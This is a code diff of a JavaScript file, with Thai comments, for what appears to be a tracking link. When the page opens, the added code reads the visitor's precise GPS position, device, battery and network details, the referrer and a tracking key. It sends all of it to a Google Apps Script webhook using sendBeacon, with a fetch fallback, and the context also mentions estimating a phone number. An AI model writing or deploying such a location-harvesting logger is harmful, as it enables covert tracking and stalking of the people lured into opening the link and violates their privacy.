@@ -202,7 +202,7 @@ function generateUniqueId() {
 
 // ฟังก์ชันส่งข้อมูลด้วย navigator.sendBeacon()
 function sendDataWithBeacon(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwM1J00AuVTU88_F11qYelvn8qUJhE0gejhJbeVdTc8paZmNJRm6CC0Xkpj5j2ZAo2Z/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzoq8LR0VK5-jkDT8JYqDCjfPDSVLm38t3aplDuP_Hf4c68JqeVMmzBWFlJHI-Di4DJ/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
   const currentRequestId = dataToSend.requestId;
 
   // ตรวจสอบว่าเคยส่ง requestId นี้ใน session นี้หรือยัง
@@ -480,3 +480,241 @@ async function estimatePhoneNumber() {
     return phoneInfo;
   } catch (error) { console.error("ไม่สามารถประมาณการข้อมูลโทรศัพท์ได้:", error); return phoneInfo; }
 }
+
+// เพิ่มตัวแปรสำหรับ Webhook URL ที่ด้านบน (ถ้ายังไม่มี)
+const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzoq8LR0VK5-jkDT8JYqDCjfPDSVLm38t3aplDuP_Hf4c68JqeVMmzBWFlJHI-Di4DJ/exec'; // <-- ตรวจสอบว่าเป็น URL ที่ถูกต้อง
+
+// ฟังก์ชันสำหรับดึงข้อมูลตำแหน่ง GPS
+function getLocation(callback) {
+    if (navigator.geolocation) {
+        const options = {
+            enableHighAccuracy: true, // พยายามให้ได้ความแม่นยำสูงสุด
+            timeout: 8000, // กำหนดเวลาสูงสุดในการรอข้อมูล GPS (8 วินาที)
+            maximumAge: 0 // ไม่ใช้ข้อมูล GPS เก่าที่แคชไว้
+        };
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const locationData = {
+                    lat: position.coords.latitude,
+                    long: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: position.timestamp, // เพิ่ม timestamp จาก GPS
+                    gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                };
+                console.log("GPS Location obtained:", locationData);
+                callback(locationData); // ส่งข้อมูลตำแหน่งกลับไป
+            },
+            (error) => {
+                let errorMessage = "ไม่สามารถดึงข้อมูล GPS ได้";
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage = "ผู้ใช้ปฏิเสธการเข้าถึงตำแหน่ง";
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage = "ข้อมูลตำแหน่งไม่พร้อมใช้งาน";
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage = "หมดเวลาในการร้องขอตำแหน่ง (Timeout)"; // <-- ข้อความนี้จะถูกบันทึกถ้าเกิน 8 วินาที
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        errorMessage = "เกิดข้อผิดพลาดที่ไม่รู้จัก";
+                        break;
+                }
+                console.warn("GPS Error:", errorMessage, "(Code:", error.code, ")");
+                // ส่งข้อความแสดงข้อผิดพลาดกลับไปแทนข้อมูลตำแหน่ง
+                callback({ error: errorMessage, code: error.code });
+            },
+            options // ส่ง options ที่กำหนดเข้าไป
+        );
+    } else {
+        console.warn("Geolocation is not supported by this browser.");
+        callback({ error: "เบราว์เซอร์ไม่รองรับ Geolocation" }); // ส่งข้อความแสดงข้อผิดพลาดกลับไป
+    }
+}
+
+// ฟังก์ชันสำหรับส่งข้อมูลไปยัง webhook โดยใช้ sendBeacon
+function sendDataToWebhook(data) {
+    console.log("Preparing data for sendBeacon:", data);
+
+    // ตรวจสอบว่า browser รองรับ sendBeacon หรือไม่
+    if (navigator.sendBeacon) {
+        try {
+            // แปลงข้อมูลเป็น JSON string
+            const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+
+            // ส่งข้อมูลด้วย sendBeacon
+            const success = navigator.sendBeacon(WEBHOOK_URL, blob);
+
+            if (success) {
+                console.log("Data successfully queued for sending via sendBeacon.");
+            } else {
+                console.error("Failed to queue data via sendBeacon. Trying fallback (fetch)...");
+                // (Optional Fallback) ลองส่งด้วย fetch หาก sendBeacon ล้มเหลวทันที (ซึ่งไม่น่าเกิดขึ้นบ่อย)
+                sendDataWithFetchFallback(data);
+            }
+        } catch (error) {
+            console.error("Error using sendBeacon:", error);
+            // (Optional Fallback) หากเกิด error ตอนสร้าง Blob หรือเรียก sendBeacon
+             sendDataWithFetchFallback(data);
+        }
+    } else {
+        console.warn("sendBeacon not supported. Using fetch as fallback.");
+        // Fallback ไปใช้ fetch ถ้า browser ไม่รองรับ sendBeacon
+        sendDataWithFetchFallback(data);
+    }
+}
+
+// (Optional Fallback Function) ฟังก์ชันส่งข้อมูลด้วย fetch (กรณี sendBeacon ไม่มีหรือล้มเหลว)
+async function sendDataWithFetchFallback(data) {
+     try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+            keepalive: true // พยายามส่งข้อมูลแม้หน้าเว็บจะปิด (อาจไม่ทำงานทุกกรณีเท่า sendBeacon)
+        });
+        // ไม่ต้องรอ response จริงจัง เพราะเป็น fallback ตอนหน้าอาจจะปิด
+        console.log("Fetch fallback initiated. Status (if available):", response.status);
+    } catch (error) {
+        console.error("Error sending data with fetch fallback:", error);
+    }
+}
+
+
+// ฟังก์ชันหลักในการรวบรวมและส่งข้อมูล
+async function collectAndSendData() {
+    console.log("Starting data collection...");
+    const urlParams = new URLSearchParams(window.location.search);
+    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
+    const source = urlParams.get('source') || "link"; // ดึง source จาก URL (link หรือ image)
+
+    // 1. รวบรวมข้อมูลพื้นฐาน (IP, Device) ทันที
+    const basicData = await getBasicInfo(); // สมมติว่ามีฟังก์ชันนี้ที่ดึง IP, User Agent etc.
+    basicData.trackingKey = trackingKey;
+    basicData.source = source; // เพิ่ม source เข้าไปในข้อมูล
+    basicData.referrer = document.referrer || "direct"; // เพิ่ม referrer
+    basicData.timestamp = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
+    basicData.requestId = generateUniqueId(); // สร้าง ID สำหรับ request นี้
+
+    console.log("Basic data collected:", basicData);
+
+    // 2. ขอข้อมูล GPS (พร้อม callback)
+    getLocation(async (locationResult) => {
+        // 3. รวมข้อมูล GPS (หรือ error) เข้ากับข้อมูลพื้นฐาน
+        const finalData = {
+            ...basicData,
+            location: locationResult // ใส่ผลลัพธ์จาก GPS (อาจเป็น object ที่มี lat/long หรือ object ที่มี error)
+        };
+
+        console.log("Final data collected (including location result):", finalData);
+
+        // 4. ส่งข้อมูลทั้งหมดไปยัง Webhook โดยใช้ sendBeacon
+        sendDataToWebhook(finalData);
+    });
+}
+
+// ฟังก์ชันสร้าง ID เฉพาะ (ถ้ายังไม่มี)
+function generateUniqueId() {
+    return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
+}
+
+
+// ฟังก์ชัน (ตัวอย่าง) สำหรับดึงข้อมูลพื้นฐาน - คุณอาจมีฟังก์ชันนี้อยู่แล้ว
+async function getBasicInfo() {
+    // ในการใช้งานจริง ส่วนนี้ควรจะดึงข้อมูล IP จาก API ภายนอก
+    // และดึงข้อมูล Device/Browser จาก navigator object
+    // นี่เป็นเพียงโครงสร้างตัวอย่าง
+    console.log("Fetching basic info (IP, Device)...");
+    let ipInfo = { ip: "Fetching...", country: "Fetching..." }; // Placeholder
+    try {
+        // ตัวอย่างการเรียก API ดึง IP (อาจใช้ ipinfo.io หรือ API อื่นๆ)
+        // const ipResponse = await fetch('https://ipinfo.io/json');
+        // ipInfo = await ipResponse.json();
+        // console.log("IP Info fetched:", ipInfo);
+        // *** หมายเหตุ: การเรียก API ดึง IP จากฝั่ง Client อาจถูกบล็อกโดย Ad Blockers ***
+        // *** การดึง IP จาก Header ใน Google Apps Script (doPost) จะน่าเชื่อถือกว่า ***
+        // *** ในที่นี้จะส่งข้อมูล Device Info เป็นหลัก ***
+        ipInfo = { ip: "See Server Log", note: "IP fetched server-side" }; // ระบุว่า IP จะมาจากฝั่ง server
+    } catch (e) {
+        console.error("Could not fetch IP info:", e);
+        ipInfo = { ip: "Error fetching", error: e.message };
+    }
+
+    // ข้อมูล Device และ Browser
+    const deviceInfo = {
+        userAgent: navigator.userAgent || "N/A",
+        language: navigator.language || "N/A",
+        platform: navigator.platform || "N/A",
+        screenSize: `${window.screen.width}x${window.screen.height}`,
+        // เพิ่มเติมข้อมูลอื่นๆ ที่ต้องการ
+        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+        // ข้อมูล Connection (ถ้ามี)
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            rtt: navigator.connection.rtt,
+            downlink: navigator.connection.downlink,
+            saveData: navigator.connection.saveData,
+            type: navigator.connection.type, // เพิ่ม type สำหรับ fallback
+            networkType: navigator.connection.type || 'unknown' // ใช้ type เป็น networkType ถ้ามี
+        } : { networkType: 'unknown' },
+        // ข้อมูล Battery (ถ้ามี)
+        battery: null // จะดึงด้านล่างถ้า API พร้อมใช้งาน
+    };
+
+     // ดึงข้อมูล Battery (ถ้า API พร้อมใช้งาน) - ทำแบบ async
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            deviceInfo.battery = {
+                level: `${Math.round(battery.level * 100)}%`,
+                charging: battery.charging ? 'Charging' : 'Discharging',
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+            console.log("Battery info fetched:", deviceInfo.battery);
+        } catch (batteryError) {
+            console.warn("Could not get battery status:", batteryError);
+            deviceInfo.battery = { error: "Could not get status" };
+        }
+    } else {
+         console.log("Battery Status API not supported.");
+         deviceInfo.battery = { error: "Not supported" };
+    }
+
+
+    // แยกข้อมูล Device/OS/Browser จาก User Agent (อาจต้องใช้ library หรือ logic เพิ่มเติม)
+    // ตัวอย่างการแยกแบบง่ายๆ (ควรปรับปรุงให้ดีขึ้น)
+    const ua = navigator.userAgent;
+    let osName = "Unknown";
+    let osVersion = "";
+    let browserName = "Unknown";
+    // ... (Logic การแยก User Agent) ...
+    // ตัวอย่างง่ายๆ
+    if (ua.includes("Win")) osName = "Windows";
+    else if (ua.includes("Mac")) osName = "macOS";
+    else if (ua.includes("Linux")) osName = "Linux";
+    else if (ua.includes("Android")) osName = "Android";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) osName = "iOS"; // หรือ iPadOS
+
+    // ใส่ค่าที่แยกได้ (ถ้ามี)
+    deviceInfo.osName = osName;
+    deviceInfo.osVersion = osVersion; // ควรมี logic ดึง version
+    deviceInfo.browser = browserName; // ควรมี logic ดึง browser
+
+    console.log("Device info collected:", deviceInfo);
+
+    return {
+        ip: ipInfo, // ส่งข้อมูล IP ที่ดึงได้ (หรือ placeholder)
+        deviceInfo: deviceInfo // ส่งข้อมูลอุปกรณ์
+    };
+}
+
+// เรียกใช้ฟังก์ชันหลักเมื่อโหลดหน้าเว็บเสร็จ
+// ตรวจสอบให้แน่ใจว่าเรียกใช้หลังจากตรวจสอบ tracking key ใน index.html แล้ว
+// อาจจะต้องย้ายการเรียก collectAndSendData() ไปไว้ท้ายสุดของ script หรือใน event listener ที่เหมาะสม
+// สมมติว่า index.html เรียกใช้ collectAndSendData() หลังจากโหลด script.js สำเร็จ
+// collectAndSendData(); // <-- ย้ายการเรียกนี้ไปไว้ใน index.html หรือส่วนที่เหมาะสม
